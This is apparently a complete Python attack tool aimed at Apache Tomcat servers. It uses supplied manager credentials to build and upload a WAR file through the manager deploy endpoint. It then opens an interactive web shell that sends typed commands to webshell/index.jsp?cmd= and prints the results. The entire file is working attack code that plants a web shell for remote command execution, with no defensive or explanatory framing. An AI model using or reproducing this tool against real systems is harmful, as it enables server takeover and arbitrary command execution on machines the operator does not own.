import requests
import base64
import os
import time
import argparse
import re

def check_url(url): 
    check = url[-1] 
    if check == "/": 
        return url
    else:
        url = url + "/"
        return url

def shell(url):
    url = url + "webshell/index.jsp?cmd="
    while True:
        try:
            requests.packages.urllib3.disable_warnings()
            p_shell = input("Shell: ")
            urls = url + p_shell
            
            print(urls)
            sr = requests.get(urls,verify=False)
            search = sr.text
            match = re.findall("<pre>(.*)</pre>",search) 
            print(match[0].replace("</br>","\n")) 

        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

def war(url,path,encoded):
    requests.packages.urllib3.disable_warnings() 
    print("Uploading WAR payload!")

    data = open('webshell.war','rb').read() 

    encoded = "Basic " + encoded
    header = {"Authorization": encoded, "Content-Type": "application/octet-stream"} 
    
    urlw = url + path + "undeploy?path=/webshell" 
    wr = requests.put(urlw,headers=header,data=data, verify=False)

    urlw = url + path + "deploy?path=/webshell" 
    wr = requests.put(urlw,headers=header,data=data, verify=False)

    if wr.status_code == 200:
        print("Payload uploaded!")
        time.sleep(1)
        shell(url)
    else:
        print("Unable to upload file!")
        time.sleep(1)
        exit()
    

def encode(url,path,user,password):
    auth = user + ":" + password
    
    encoded = auth.encode("ascii")
    encoded = base64.b64encode(encoded)
    encoded = encoded.decode("ascii")

    war(url,path,encoded)

def payload_w(url,path,user,password):
    print("Building WAR file")
    time.sleep(1) 
    os.system("jar -cvf webshell.war index.jsp")  
    
    encode(url,path,user,password)

def main():
    parser = argparse.ArgumentParser(description='Tomcat WAR File Upload')

    parser.add_argument('-t', metavar="<Target's URL>", help='target/host IP, E.G: http://tomcatsite.blah/', required=True)
    parser.add_argument('-u', metavar='<username>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help='Password', required=True)
    parser.add_argument('--version', metavar='<version>', help='The tomcat version E.G --version 8', required=True)
    args = parser.parse_args()

    url = args.t
    user = args.u
    password = args.p
    ver = args.version

    url = check_url(url)   

    if ver >= '7': 
        path = '/manager/text/'
    else:
        path = '/manager/'

    print("Welcome to WAR tomcat file uploader!")
    time.sleep(1)

    payload_w(url,path,user,password)

if __name__ == "__main__":
    main()
